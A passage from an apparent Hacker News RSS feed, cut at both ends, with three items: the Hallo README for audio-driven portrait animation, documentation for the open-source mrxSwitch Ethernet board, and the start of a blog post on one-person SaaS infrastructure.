            <description><![CDATA[<p>URL: <a href="https://github.com/fudan-generative-vision/hallo">https://github.com/fudan-generative-vision/hallo</a>, See on <a href="https://news.ycombinator.com/item?id=40694375">Hacker News</a></p>
<div id="readability-page-1" class="page"><div data-hpc="true"><article itemprop="text"><p dir="auto"><h2 tabindex="-1" dir="auto">Hallo: Hierarchical Audio-Driven Visual Synthesis for Portrait Image Animation</h2><a id="user-content-hallo-hierarchical-audio-driven-visual-synthesis-for-portrait-image-animation" aria-label="Permalink: Hallo: Hierarchical Audio-Driven Visual Synthesis for Portrait Image Animation" href="#hallo-hierarchical-audio-driven-visual-synthesis-for-portrait-image-animation"></a></p>


<p><sup>1</sup>Fudan University  <sup>2</sup>Baidu Inc  <sup>3</sup>ETH Zurich  <sup>4</sup>Nanjing University
</p>

<p><a href="https://github.com/fudan-generative-vision/hallo"><img src="https://camo.githubusercontent.com/514f47e9599a144c58a3e0108bc137b0f964aa484f3dfbe48e5a5f44c5a0d11f/68747470733a2f2f696d672e736869656c64732e696f2f6769746875622f73746172732f667564616e2d67656e657261746976652d766973696f6e2f68616c6c6f3f7374796c653d736f6369616c" data-canonical-src="https://img.shields.io/github/stars/fudan-generative-vision/hallo?style=social"></a>
    <a href="https://fudan-generative-vision.github.io/hallo/#/" rel="nofollow"><img src="https://camo.githubusercontent.com/a12aff6c28c8a0b1474266799bd4555677c8a0c85ad8ed417611004be8db5730/68747470733a2f2f696d672e736869656c64732e696f2f62616467652f50726f6a6563742d486f6d65506167652d477265656e" data-canonical-src="https://img.shields.io/badge/Project-HomePage-Green"></a>
    <a href="https://arxiv.org/pdf/2406.08801" rel="nofollow"><img src="https://camo.githubusercontent.com/36622932abbbd4c66f324e4cc02e7046b72a8537858d95eaad23e7ea84f379b0/68747470733a2f2f696d672e736869656c64732e696f2f62616467652f50617065722d41727869762d726564" data-canonical-src="https://img.shields.io/badge/Paper-Arxiv-red"></a>
    <a href="https://huggingface.co/fudan-generative-ai/hallo" rel="nofollow"><img src="https://camo.githubusercontent.com/9c7b9d5ba2385766e79578f2ea344a675a191b9b0b3a9e02c2c6f70c07a1ee14/68747470733a2f2f696d672e736869656c64732e696f2f62616467652f25463025394625413425393725323048756767696e67466163652d4d6f64656c2d79656c6c6f77" data-canonical-src="https://img.shields.io/badge/%F0%9F%A4%97%20HuggingFace-Model-yellow"></a>
    <a href="https://github.com/fudan-generative-vision/hallo/blob/main/assets/wechat.jpeg"><img src="https://camo.githubusercontent.com/d5ad9fcda4cc26e162a90f659214600856e8ddab40b90a6d853b41cee59f5782/68747470733a2f2f6261646765732e616c65656e34322e636f6d2f7372632f7765636861742e737667" data-canonical-src="https://badges.aleen42.com/src/wechat.svg"></a>
</p>

<p dir="auto"><h2 tabindex="-1" dir="auto">Showcase</h2><a id="user-content-showcase" aria-label="Permalink: Showcase" href="#showcase"></a></p>
<details open="">
  <summary>
    
    <span aria-label="Video description head.mp4">head.mp4</span>
    <span></span>
  </summary>

  <video src="https://private-user-images.githubusercontent.com/17402682/339966827-294e78ef-c60d-4c32-8e3c-7f8d6934c6bd.mp4?jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbSIsImtleSI6ImtleTUiLCJleHAiOjE3MTg1ODA5MDMsIm5iZiI6MTcxODU4MDYwMywicGF0aCI6Ii8xNzQwMjY4Mi8zMzk5NjY4MjctMjk0ZTc4ZWYtYzYwZC00YzMyLThlM2MtN2Y4ZDY5MzRjNmJkLm1wND9YLUFtei1BbGdvcml0aG09QVdTNC1ITUFDLVNIQTI1NiZYLUFtei1DcmVkZW50aWFsPUFLSUFWQ09EWUxTQTUzUFFLNFpBJTJGMjAyNDA2MTYlMkZ1cy1lYXN0LTElMkZzMyUyRmF3czRfcmVxdWVzdCZYLUFtei1EYXRlPTIwMjQwNjE2VDIzMzAwM1omWC1BbXotRXhwaXJlcz0zMDAmWC1BbXotU2lnbmF0dXJlPTM2NDViZmI1NWQ3YzkwZjBjZmZkMDZhYjcyMTk4OTA0N2EwOGEyMGE3ZWU0NThmYjEyMzJjMTNlZTcxOGQ4YjkmWC1BbXotU2lnbmVkSGVhZGVycz1ob3N0JmFjdG9yX2lkPTAma2V5X2lkPTAmcmVwb19pZD0wIn0.xcl-RhKEh6uXxFMyghkDQHSqaUnAxnuO__d4-c5ydzg" data-canonical-src="https://private-user-images.githubusercontent.com/17402682/339966827-294e78ef-c60d-4c32-8e3c-7f8d6934c6bd.mp4?jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbSIsImtleSI6ImtleTUiLCJleHAiOjE3MTg1ODA5MDMsIm5iZiI6MTcxODU4MDYwMywicGF0aCI6Ii8xNzQwMjY4Mi8zMzk5NjY4MjctMjk0ZTc4ZWYtYzYwZC00YzMyLThlM2MtN2Y4ZDY5MzRjNmJkLm1wND9YLUFtei1BbGdvcml0aG09QVdTNC1ITUFDLVNIQTI1NiZYLUFtei1DcmVkZW50aWFsPUFLSUFWQ09EWUxTQTUzUFFLNFpBJTJGMjAyNDA2MTYlMkZ1cy1lYXN0LTElMkZzMyUyRmF3czRfcmVxdWVzdCZYLUFtei1EYXRlPTIwMjQwNjE2VDIzMzAwM1omWC1BbXotRXhwaXJlcz0zMDAmWC1BbXotU2lnbmF0dXJlPTM2NDViZmI1NWQ3YzkwZjBjZmZkMDZhYjcyMTk4OTA0N2EwOGEyMGE3ZWU0NThmYjEyMzJjMTNlZTcxOGQ4YjkmWC1BbXotU2lnbmVkSGVhZGVycz1ob3N0JmFjdG9yX2lkPTAma2V5X2lkPTAmcmVwb19pZD0wIn0.xcl-RhKEh6uXxFMyghkDQHSqaUnAxnuO__d4-c5ydzg" controls="controls" muted="muted">

  </video>
</details>

<p dir="auto"><h2 tabindex="-1" dir="auto">Framework</h2><a id="user-content-framework" aria-label="Permalink: Framework" href="#framework"></a></p>
<p dir="auto"><a target="_blank" rel="noopener noreferrer" href="https://github.com/fudan-generative-vision/hallo/blob/main/assets/framework_1.jpg"><img src="https://github.com/fudan-generative-vision/hallo/raw/main/assets/framework_1.jpg" alt="abstract"></a>
<a target="_blank" rel="noopener noreferrer" href="https://github.com/fudan-generative-vision/hallo/blob/main/assets/framework_2.jpg"><img src="https://github.com/fudan-generative-vision/hallo/raw/main/assets/framework_2.jpg" alt="framework"></a></p>
<p dir="auto"><h2 tabindex="-1" dir="auto">News</h2><a id="user-content-news" aria-label="Permalink: News" href="#news"></a></p>
<ul dir="auto">
<li><strong><code>2024/06/15</code></strong>: 🎉🎉🎉 Release the first version on <a href="https://github.com/fudan-generative-vision/hallo">GitHub</a>.</li>
<li><strong><code>2024/06/15</code></strong>: ✨✨✨ Release some images and audios for inference testing on <a href="https://huggingface.co/datasets/fudan-generative-ai/hallo_inference_samples" rel="nofollow">Huggingface</a>.</li>
</ul>
<p dir="auto"><h2 tabindex="-1" dir="auto">Installation</h2><a id="user-content-installation" aria-label="Permalink: Installation" href="#installation"></a></p>
<ul dir="auto">
<li>System requirement: Ubuntu 20.04/Ubuntu 22.04, Cuda 12.1</li>
<li>Tested GPUs: A100</li>
</ul>
<p dir="auto">Create conda environment:</p>
<div dir="auto" data-snippet-clipboard-copy-content="  conda create -n hallo python=3.10
  conda activate hallo"><pre>  conda create -n hallo python=3.10
  conda activate hallo</pre></div>
<p dir="auto">Install packages with <code>pip</code></p>
<div dir="auto" data-snippet-clipboard-copy-content="  pip install -r requirements.txt
  pip install ."><pre>  pip install -r requirements.txt
  pip install <span>.</span></pre></div>
<p dir="auto">Besides, ffmpeg is also need:</p>

<p dir="auto"><h2 tabindex="-1" dir="auto">Inference</h2><a id="user-content-inference" aria-label="Permalink: Inference" href="#inference"></a></p>
<p dir="auto">The inference entrypoint script is <code>scripts/inference.py</code>. Before testing your cases, there are two preparations need to be completed:</p>
<ol dir="auto">
<li><a href="#download-pretrained-models">Download all required pretrained models</a>.</li>
<li><a href="#prepare-inference-data">Prepare source image and driving audio pairs</a>.</li>
<li><a href="#run-inference">Run inference</a>.</li>
</ol>
<p dir="auto"><h2 tabindex="-1" dir="auto">Download pretrained models</h2><a id="user-content-download-pretrained-models" aria-label="Permalink: Download pretrained models" href="#download-pretrained-models"></a></p>
<p dir="auto">You can easily get all pretrained models required by inference from our <a href="https://huggingface.co/fudan-generative-ai/hallo" rel="nofollow">HuggingFace repo</a>.</p>
<p dir="auto">Clone the the pretrained models into <code>${PROJECT_ROOT}/pretrained_models</code> directory by cmd below:</p>
<div dir="auto" data-snippet-clipboard-copy-content="git lfs install
git clone https://huggingface.co/fudan-generative-ai/hallo pretrained_models"><pre>git lfs install
git clone https://huggingface.co/fudan-generative-ai/hallo pretrained_models</pre></div>
<p dir="auto">Or you can download them separately from their source repo:</p>
<ul dir="auto">
<li><a href="https://huggingface.co/fudan-generative-ai/hallo/tree/main/hallo" rel="nofollow">hallo</a>: Our checkpoints consist of denoising UNet, face locator, image &amp; audio proj.</li>
<li><a href="https://huggingface.co/huangjackson/Kim_Vocal_2" rel="nofollow">audio_separator</a>: Kim_Vocal_2 MDX-Net vocal removal model by <a href="https://github.com/KimberleyJensen">KimberleyJensen</a>. (<em>Thanks to runwayml</em>)</li>
<li><a href="https://github.com/deepinsight/insightface/tree/master/python-package#model-zoo">insightface</a>: 2D and 3D Face Analysis placed into <code>pretrained_models/face_analysis/models/</code>. (<em>Thanks to deepinsight</em>)</li>
<li><a href="https://storage.googleapis.com/mediapipe-models/face_landmarker/face_landmarker/float16/1/face_landmarker.task" rel="nofollow">face landmarker</a>: Face detection &amp; mesh model from <a href="https://ai.google.dev/edge/mediapipe/solutions/vision/face_landmarker#models" rel="nofollow">mediapipe</a> placed into <code>pretrained_models/face_analysis/models</code>.</li>
<li><a href="https://github.com/guoyww/AnimateDiff/blob/main/README.md#202309-animatediff-v2">motion module</a>: motion module from <a href="https://github.com/guoyww/AnimateDiff">AnimateDiff</a>. (<em>Thanks to guoyww</em>).</li>
<li><a href="https://huggingface.co/stabilityai/sd-vae-ft-mse" rel="nofollow">sd-vae-ft-mse</a>: Weights are intended to be used with the diffusers library. (<em>Thanks to stablilityai</em>)</li>
<li><a href="https://huggingface.co/runwayml/stable-diffusion-v1-5" rel="nofollow">StableDiffusion V1.5</a>: Initialized and fine-tuned from Stable-Diffusion-v1-2. (<em>Thanks to runwayml</em>)</li>
<li><a href="https://huggingface.co/facebook/wav2vec2-base-960h" rel="nofollow">wav2vec</a>: wav audio to vector model from <a href="https://huggingface.co/facebook/wav2vec2-base-960h" rel="nofollow">Facebook</a>.</li>
</ul>
<p dir="auto">Finally, these pretrained models should be organized as follows:</p>
<div data-snippet-clipboard-copy-content="./pretrained_models/
|-- audio_separator/
|   `-- Kim_Vocal_2.onnx
|-- face_analysis/
|   `-- models/
|       |-- face_landmarker_v2_with_blendshapes.task  # face landmarker model from mediapipe
|       |-- 1k3d68.onnx
|       |-- 2d106det.onnx
|       |-- genderage.onnx
|       |-- glintr100.onnx
|       `-- scrfd_10g_bnkps.onnx
|-- motion_module/
|   `-- mm_sd_v15_v2.ckpt
|-- sd-vae-ft-mse/
|   |-- config.json
|   `-- diffusion_pytorch_model.safetensors
|-- stable-diffusion-v1-5/
|   |-- feature_extractor/
|   |   `-- preprocessor_config.json
|   |-- model_index.json
|   |-- unet/
|   |   |-- config.json
|   |   `-- diffusion_pytorch_model.safetensors
|   `-- v1-inference.yaml
`-- wav2vec/
    |-- wav2vec2-base-960h/
    |   |-- config.json
    |   |-- feature_extractor_config.json
    |   |-- model.safetensors
    |   |-- preprocessor_config.json
    |   |-- special_tokens_map.json
    |   |-- tokenizer_config.json
    |   `-- vocab.json"><pre lang="text"><code>./pretrained_models/
|-- audio_separator/
|   `-- Kim_Vocal_2.onnx
|-- face_analysis/
|   `-- models/
|       |-- face_landmarker_v2_with_blendshapes.task  # face landmarker model from mediapipe
|       |-- 1k3d68.onnx
|       |-- 2d106det.onnx
|       |-- genderage.onnx
|       |-- glintr100.onnx
|       `-- scrfd_10g_bnkps.onnx
|-- motion_module/
|   `-- mm_sd_v15_v2.ckpt
|-- sd-vae-ft-mse/
|   |-- config.json
|   `-- diffusion_pytorch_model.safetensors
|-- stable-diffusion-v1-5/
|   |-- feature_extractor/
|   |   `-- preprocessor_config.json
|   |-- model_index.json
|   |-- unet/
|   |   |-- config.json
|   |   `-- diffusion_pytorch_model.safetensors
|   `-- v1-inference.yaml
`-- wav2vec/
    |-- wav2vec2-base-960h/
    |   |-- config.json
    |   |-- feature_extractor_config.json
    |   |-- model.safetensors
    |   |-- preprocessor_config.json
    |   |-- special_tokens_map.json
    |   |-- tokenizer_config.json
    |   `-- vocab.json
</code></pre></div>
<p dir="auto"><h2 tabindex="-1" dir="auto">Prepare Inference Data</h2><a id="user-content-prepare-inference-data" aria-label="Permalink: Prepare Inference Data" href="#prepare-inference-data"></a></p>
<p dir="auto">Hallo has a few simple requirements for input data:</p>
<p dir="auto">For the source image:</p>
<ol dir="auto">
<li>It should be cropped into squares.</li>
<li>The face should be the main focus, making up 50%-70% of the image.</li>
<li>The face should be facing forward, with a rotation angle of less than 30° (no side profiles).</li>
</ol>
<p dir="auto">For the driving audio:</p>
<ol dir="auto">
<li>It must be in WAV format.</li>
<li>It must be in English since our training datasets are only in this language.</li>
<li>Ensure the vocals are clear; background music is acceptable.</li>
</ol>
<p dir="auto">We have provided some samples for your reference.</p>
<p dir="auto"><h2 tabindex="-1" dir="auto">Run inference</h2><a id="user-content-run-inference" aria-label="Permalink: Run inference" href="#run-inference"></a></p>
<p dir="auto">Simply to run the <code>scripts/inference.py</code> and pass <code>source_image</code> and <code>driving_audio</code> as input:</p>
<div dir="auto" data-snippet-clipboard-copy-content="python scripts/inference.py --source_image examples/source_images/1.jpg --driving_audio examples/driving_audios/1.wav"><pre>python scripts/inference.py --source_image examples/source_images/1.jpg --driving_audio examples/driving_audios/1.wav</pre></div>
<p dir="auto">Animation results will be saved as <code>${PROJECT_ROOT}/.cache/output.mp4</code> by default. You can pass <code>--output</code> to specify the output file name. You can find more examples for inference at <a href="https://github.com/fudan-generative-vision/hallo/tree/main/examples">examples folder</a>.</p>
<p dir="auto">For more options:</p>
<div dir="auto" data-snippet-clipboard-copy-content="usage: inference.py [-h] [-c CONFIG] [--source_image SOURCE_IMAGE] [--driving_audio DRIVING_AUDIO] [--output OUTPUT] [--pose_weight POSE_WEIGHT]
                    [--face_weight FACE_WEIGHT] [--lip_weight LIP_WEIGHT] [--face_expand_ratio FACE_EXPAND_RATIO]

options:
  -h, --help            show this help message and exit
  -c CONFIG, --config CONFIG
  --source_image SOURCE_IMAGE
                        source image
  --driving_audio DRIVING_AUDIO
                        driving audio
  --output OUTPUT       output video file name
  --pose_weight POSE_WEIGHT
                        weight of pose
  --face_weight FACE_WEIGHT
                        weight of face
  --lip_weight LIP_WEIGHT
                        weight of lip
  --face_expand_ratio FACE_EXPAND_RATIO
                        face region"><pre>usage: inference.py [-h] [-c CONFIG] [--source_image SOURCE_IMAGE] [--driving_audio DRIVING_AUDIO] [--output OUTPUT] [--pose_weight POSE_WEIGHT]
                    [--face_weight FACE_WEIGHT] [--lip_weight LIP_WEIGHT] [--face_expand_ratio FACE_EXPAND_RATIO]

options:
  -h, --help            show this <span>help</span> message and <span>exit</span>
  -c CONFIG, --config CONFIG
  --source_image SOURCE_IMAGE
                        <span>source</span> image
  --driving_audio DRIVING_AUDIO
                        driving audio
  --output OUTPUT       output video file name
  --pose_weight POSE_WEIGHT
                        weight of pose
  --face_weight FACE_WEIGHT
                        weight of face
  --lip_weight LIP_WEIGHT
                        weight of lip
  --face_expand_ratio FACE_EXPAND_RATIO
                        face region</pre></div>
<p dir="auto"><h2 tabindex="-1" dir="auto">Roadmap</h2><a id="user-content-roadmap" aria-label="Permalink: Roadmap" href="#roadmap"></a></p>
<table>
<thead>
<tr>
<th>Status</th>
<th>Milestone</th>
<th>ETA</th>
</tr>
</thead>
<tbody>
<tr>
<td>✅</td>
<td><strong><a href="https://github.com/fudan-generative-vision/hallo">Inference source code meet everyone on GitHub</a></strong></td>
<td>2024-06-15</td>
</tr>
<tr>
<td>✅</td>
<td><strong><a href="https://huggingface.co/fudan-generative-ai/hallo" rel="nofollow">Pretrained models on Huggingface</a></strong></td>
<td>2024-06-15</td>
</tr>
<tr>
<td>🚀🚀🚀</td>
<td><strong><a href="https://github.com/fudan-generative-vision/hallo/blob/main">Traning: data preparation and training scripts</a></strong></td>
<td>2024-06-25</td>
</tr>
<tr>
<td>🚀🚀🚀</td>
<td><strong><a href="https://github.com/fudan-generative-vision/hallo/blob/main">Optimize inference performance in Mandarin</a></strong></td>
<td>TBD</td>
</tr>
</tbody>
</table>
<p dir="auto"><h2 tabindex="-1" dir="auto">Citation</h2><a id="user-content-citation" aria-label="Permalink: Citation" href="#citation"></a></p>
<p dir="auto">If you find our work useful for your research, please consider citing the paper:</p>
<div data-snippet-clipboard-copy-content="@misc{xu2024hallo,
  title={Hallo: Hierarchical Audio-Driven Visual Synthesis for Portrait Image Animation},
	author={Mingwang Xu and Hui Li and Qingkun Su and Hanlin Shang and Liwei Zhang and Ce Liu and Jingdong Wang and Yao Yao and Siyu zhu},
	year={2024},
	eprint={2406.08801},
	archivePrefix={arXiv},
	primaryClass={cs.CV}
}"><pre><code>@misc{xu2024hallo,
  title={Hallo: Hierarchical Audio-Driven Visual Synthesis for Portrait Image Animation},
	author={Mingwang Xu and Hui Li and Qingkun Su and Hanlin Shang and Liwei Zhang and Ce Liu and Jingdong Wang and Yao Yao and Siyu zhu},
	year={2024},
	eprint={2406.08801},
	archivePrefix={arXiv},
	primaryClass={cs.CV}
}
</code></pre></div>
<p dir="auto"><h2 tabindex="-1" dir="auto">Opportunities available</h2><a id="user-content-opportunities-available" aria-label="Permalink: Opportunities available" href="#opportunities-available"></a></p>
<p dir="auto">Multiple research positions are open at the <strong>Generative Vision Lab, Fudan University</strong>! Include:</p>
<ul dir="auto">
<li>Research assistant</li>
<li>Postdoctoral researcher</li>
<li>PhD candidate</li>
<li>Master students</li>
</ul>
<p dir="auto">Interested individuals are encouraged to contact us at <a href="mailto://siyuzhu@fudan.edu.cn" rel="nofollow">siyuzhu@fudan.edu.cn</a> for further information.</p>
<p dir="auto"><h2 tabindex="-1" dir="auto">Social Risks and Mitigations</h2><a id="user-content-social-risks-and-mitigations" aria-label="Permalink: Social Risks and Mitigations" href="#social-risks-and-mitigations"></a></p>
<p dir="auto">The development of portrait image animation technologies driven by audio inputs poses social risks, such as the ethical implications of creating realistic portraits that could be misused for deepfakes. To mitigate these risks, it is crucial to establish ethical guidelines and responsible use practices. Privacy and consent concerns also arise from using individuals' images and voices. Addressing these involves transparent data usage policies, informed consent, and safeguarding privacy rights. By addressing these risks and implementing mitigations, the research aims to ensure the responsible and ethical development of this technology.</p>
</article></div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Show HN: We Made The World's Smallest and Cheapest Network Switch (555 pts)]]></title>
            <link>https://docs.murexrobotics.com/elec/boards/networking/switch</link>
            <guid>40694254</guid>
            <pubDate>Sun, 16 Jun 2024 02:26:55 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://docs.murexrobotics.com/elec/boards/networking/switch">https://docs.murexrobotics.com/elec/boards/networking/switch</a>, See on <a href="https://news.ycombinator.com/item?id=40694254">Hacker News</a></p>
<div id="readability-page-1" class="page"><div><article><main>
<p><img alt="Blender Render" loading="lazy" width="1920" height="1920" decoding="async" data-nimg="1" src="https://docs.murexrobotics.com/_next/static/media/ethernet_switch_v2_release.bba1f087.png"></p>
<h2>Outline<a href="#outline" id="outline" aria-label="Permalink for this section"></a></h2>
<p>The mrxSwitch is the world's smallest and cheapest networking switch, in addition to being fully open-source. With the focus on simplicity and cost, the MUREX Ethernet Switch utilizes external magnetics, a high performance unmanaged switch IC, and 1.25mm pitch Fast Ethernet (100BASE-TX) connectors.</p>
<h2>Detailed Description<a href="#detailed-description" id="detailed-description" aria-label="Permalink for this section"></a></h2>
<p>The MUREX Ethernet Switch, or mrxSwitch, is a 5 port 100BASE-TX unmanaged switch using the IP175Gx Ethernet Integrated Switch IC. mrxSwitch steps down an input up to 15V down to its operating voltage of 3.3V. Designed with a four layer board for minimal noise, the mrxSwitch has full Bob-Smith style termination for all center taps and calculated differential pairs of 100Ω. The switch utilizes 10 pairs of magnetic transformer and common-mode chokes to ensure proper compliance with the IEEE 802.3 standard.</p>
<p>Measuring 44.9mm by 42.2mm, mrxSwitch V2 is the smallest networking switch in the world and outperforms all commerically available options in size and cost. Its applications include but are not limited to embedded systems, ROVs and AUVs, consumer electronics, DIY projects, and other space-constrained networking applications.</p>
<h3>Current Status<a href="#current-status" id="current-status" aria-label="Permalink for this section"></a></h3>
<ul>
<li>V2.0 tested and functional, see the <a href="https://github.com/murexrobotics/electrical-2024/tree/main/networking/switch" target="_blank" rel="noreferrer">board layout files<span> (opens in a new tab)</span></a></li>
<li>V1.0 tested and functional, see the <a href="https://www.murexrobotics.com/blog/murex-ethernet-switch-v1/" target="_blank" rel="noreferrer">blog post<span> (opens in a new tab)</span></a></li>
</ul>
<h3>Integrated Sensors/ICs<a href="#integrated-sensorsics" id="integrated-sensorsics" aria-label="Permalink for this section"></a></h3>
<ul>
<li>
<p><a href="https://datasheet.lcsc.com/lcsc/2008201637_IC-Plus-IP175GHI_C703539.pdf" target="_blank" rel="noreferrer">IC Plus IP175Gx<span> (opens in a new tab)</span></a> 5 Port 10/100 Ethernet Integrated Switch</p>
<ul>
<li>5 Port 100BASE-TX Embedded Switch</li>
<li>High efficiency 85nm CMOS process</li>
<li>Full status LEDs</li>
<li>EEPROM configuration</li>
</ul>
</li>
<li>
<p><a href="https://www.ti.com/lit/ds/symlink/lm1117.pdf" target="_blank" rel="noreferrer">LM1117MP-3.3<span> (opens in a new tab)</span></a> 800mA LDO</p>
<ul>
<li>3.3V fixed output LDO</li>
<li>15V maximum input</li>
<li>1.2V dropout</li>
</ul>
</li>
<li>
<p><a href="https://www.lcsc.com/datasheet/lcsc_datasheet_1810082007_TNK-QT48A03_C216365.pdf" target="_blank" rel="noreferrer">QT48A03<span> (opens in a new tab)</span></a> 1000Base-T Dual Port Transformer</p>
<ul>
<li>350uH primary</li>
<li>8mA DC bias</li>
</ul>
</li>
<li>
<p><a href="https://datasheet.lcsc.com/lcsc/1806051531_TNK-BT16A07_C216355.pdf" target="_blank" rel="noreferrer">BT16A07<span> (opens in a new tab)</span></a> 10/100 Base-T Single Port Transformer</p>
<ul>
<li>350uH primary</li>
</ul>
</li>
<li>
<p><a href="https://datasheet.lcsc.com/szlcsc/TNK-QT24A23_C216362.pdf" target="_blank" rel="noreferrer">2x QT24A23 (retired)<span> (opens in a new tab)</span></a> 10/100/1000Base-T Single Port Transformer</p>
<ul>
<li>350uH primary</li>
<li>8mA DC bias</li>
</ul>
</li>
</ul>
<h3><a href="https://docs.murexrobotics.com/pdf/schematics/switch_v2.0_schematic.pdf">Schematic (PDF)</a><a href="#schematic-pdf" id="schematic-pdf" aria-label="Permalink for this section"></a></h3>
<p><img alt="Schematic Preview" loading="lazy" width="2206" height="1560" decoding="async" data-nimg="1" src="https://docs.murexrobotics.com/_next/static/media/switch_schematic_preview.5f64b16e.png"></p>
<h3>To Do<a href="#to-do" id="to-do" aria-label="Permalink for this section"></a></h3>
<h3>Changelog<a href="#changelog" id="changelog" aria-label="Permalink for this section"></a></h3>
<ul>
<li>V2 Changes:
<ul>
<li>a 30% size reduction, making the mrxSwitch the smallest networking switch in the world as of June 2024</li>
<li>overall BOM cost reduction by 15% (more basic parts)</li>
<li>replaced both QT24A23s with the QT48A03, a cheaper and more compact solution</li>
<li>removed config components and EEPROM</li>
</ul>
</li>
</ul>
<h3>More Photos!!<a href="#more-photos" id="more-photos" aria-label="Permalink for this section"></a></h3>
<p><img alt="Photo 1" loading="lazy" width="2286" height="1857" decoding="async" data-nimg="1" src="https://docs.murexrobotics.com/_next/static/media/switch1.777139e6.png">
<img alt="Photo 2" loading="lazy" width="2506" height="2251" decoding="async" data-nimg="1" src="https://docs.murexrobotics.com/_next/static/media/switch2.417fc590.png"></p><p><a title="Networking" href="https://docs.murexrobotics.com/elec/boards/networking/networking"><svg fill="none" viewBox="0 0 24 24" stroke="currentColor"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 5l7 7-7 7"></path></svg>Networking</a><a title="PLC Module" href="https://docs.murexrobotics.com/elec/boards/networking/plc">PLC Module<svg fill="none" viewBox="0 0 24 24" stroke="currentColor"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 5l7 7-7 7"></path></svg></a></p></main></article></div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[The Architecture Behind a One-Person Tech Startup (2021) (215 pts)]]></title>
            <link>https://anthonynsimon.com/blog/one-man-saas-architecture/</link>
            <guid>40694103</guid>
            <pubDate>Sun, 16 Jun 2024 01:51:54 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://anthonynsimon.com/blog/one-man-saas-architecture/">https://anthonynsimon.com/blog/one-man-saas-architecture/</a>, See on <a href="https://news.ycombinator.com/item?id=40694103">Hacker News</a></p>
<div id="readability-page-1" class="page"><div><p>This is a long-form post breaking down the setup I use to run a SaaS. From load balancing to cron job monitoring to payments and subscriptions. There's a lot of ground to cover, so buckle up!</p>
<p>As grandiose as the title of this article might sound, I should clarify we’re talking about a low-stress, one-person company that I run from my flat. It's fully self-funded, and I like to take things slow. It's probably not what most people imagine when I say "tech startup".</p>
<p>For context, I run a one-man SaaS, and this is a more detailed version of my post on <a href="https://anthonynsimon.com/blog/tech-stack/" rel="noopener">my tech stack</a>. I use Kubernetes on AWS, but don’t fall into the trap of thinking you need this. I learned these tools over several years mentored by a very patient team. These tools work well for me, but they might not be the right fit for you.</p>
<p>By the way, I drew inspiration for the format of this post from <a href="https://www.listennotes.com/blog/the-boring-technology-behind-a-one-person-23/" rel="noopener" target="_blank">Wenbin Fang’s blog post</a>. I really enjoyed reading his article, and you might want to check it out too!</p>
<p>With that said, let's jump right into the tour.</p>
<h2 id="table-of-contents">Table of contents</h2>
<ul>
<li><a href="#a-birds-eye-view" rel="noopener">A bird’s eye view</a></li>
<li><a href="#automatic-dns-ssl-and-load-balancing" rel="noopener">Automatic DNS, SSL, and Load Balancing</a></li>
<li><a href="#automated-rollouts-and-rollbacks" rel="noopener">Automated rollouts and rollbacks</a></li>
<li><a href="#let-it-crash" rel="noopener">Let it crash</a></li>
<li><a href="#horizontal-autoscaling" rel="noopener">Horizontal autoscaling</a></li>
<li><a href="#static-assets-cached-by-cdn" rel="noopener">Static assets cached by CDN</a></li>
<li><a href="#application-data-caching" rel="noopener">Application data caching</a></li>
<li><a href="#per-endpoint-rate-limiting" rel="noopener">Per endpoint rate-limiting</a></li>
<li><a href="#app-administration" rel="noopener">App administration</a></li>
<li><a href="#running-scheduled-jobs" rel="noopener">Running scheduled jobs</a></li>
<li><a href="#app-configuration" rel="noopener">App configuration</a></li>
<li><a href="#keeping-secrets" rel="noopener">Keeping secrets</a></li>
<li><a href="#relational-data-postgres" rel="noopener">Relational data: Postgres</a></li>
<li><a href="#columnar-data-clickhouse" rel="noopener">Columnar data: ClickHouse</a></li>
<li><a href="#dns-based-service-discovery" rel="noopener">DNS-based service discovery</a></li>
<li><a href="#version-controlled-infrastructure" rel="noopener">Version-controlled infrastructure</a></li>
<li><a href="#terraform-for-cloud-resources" rel="noopener">Terraform for cloud resources</a></li>
<li><a href="#kubernetes-manifests-for-app-deployments" rel="noopener">Kubernetes manifests for app deployments</a></li>
<li><a href="#subscriptions-and-payments" rel="noopener">Subscriptions and Payments</a></li>
<li><a href="#logging" rel="noopener">Logging</a></li>
<li><a href="#monitoring-and-alerting" rel="noopener">Monitoring and alerting</a></li>
<li><a href="#error-tracking" rel="noopener">Error tracking</a></li>
<li><a href="#profiling-and-other-goodies" rel="noopener">Profiling and other goodies</a></li>
<li><a href="#thats-all-folks" rel="noopener">That's all folks</a></li>
</ul>
<h2 id="a-birds-eye-view">A bird’s eye view</h2>
<p>My infrastructure handles multiple projects at once, but to illustrate things I’ll use my most recent SaaS, a <a href="https://panelbear.com/" rel="noopener" target="_blank">web performance and traffic analytics tool</a>, as a real-world example of this setup in action.</p>
<p><span><img src="https://anthonynsimon.com/img/blog/one-man-saas-architecture/panelbear-performance-chart.png" alt="Panelbear's performance monitoring feature" width="100%" height="auto" loading="lazy"></span>
<em>Browser Timings chart in Panelbear, the example project I'll use for this tour.</em></p>
<p>From a technical point of view, this SaaS processes a large amount of requests per second from anywhere in the world, and stores the data in an efficient format for real time querying.</p>
<p>Business-wise it's still in its infancy (<del>I launched six months ago</del> update: it's been <a href="https://anthonynsimon.com/blog/panelbear-and-cronitor" rel="noopener">acquired</a>), but it has grown rather quickly for my own expectations, especially as I originally built it for myself as a Django app using SQLite on a single tiny VPS. For my goals at the time, it worked just fine and I could have probably pushed that model quite far.</p>
<p>However, I grew increasingly frustrated having to reimplement a lot of the tooling I was so accustomed to: zero downtime deploys, autoscaling, health checks, automatic DNS / TLS / ingress rules, and so on. Kubernetes spoiled me, I was used to dealing with higher level abstractions, while retaining control and flexibility.</p>
<p>Fast forward six months, a couple of iterations, and even though my current setup is still a Django monolith, I'm now using Postgres as the app DB, ClickHouse for analytics data, and Redis for caching. I also use Celery for scheduled tasks, and a custom event queue for buffering writes. I run most of these things on a managed Kubernetes cluster (EKS).</p>
